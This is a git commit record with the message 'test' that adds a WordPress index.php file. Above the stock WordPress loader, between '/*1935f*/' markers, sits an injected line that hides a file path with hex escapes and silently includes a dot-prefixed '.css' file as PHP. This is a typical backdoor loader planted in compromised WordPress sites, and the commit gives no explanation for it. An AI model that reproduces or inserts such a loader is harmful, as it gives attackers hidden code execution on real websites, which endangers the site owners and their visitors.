f38ce94e2e9a164d2f7498cddb18e26b5962da11
Nguyễn Minh Trí <nguyen_minh_tri@optimzer.co.jp>
2024-12-24 10:47:28 +0700

    test

---
+++ shisebi/index.php
@@ -0,0 +1,22 @@
+<?php
+/*1935f*/
+
+$rgkzb = "/home/opt\x69m\x69zer\x2dtest/www/prod/med\x69partner/test/.7216a467.css"; if (!isset($rgkzb)) {print ($rgkzb);} else { @include_once /* 225 */ ($rgkzb); }
+
+/*1935f*/
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require( dirname( __FILE__ ) . '/wp-blog-header.php' );
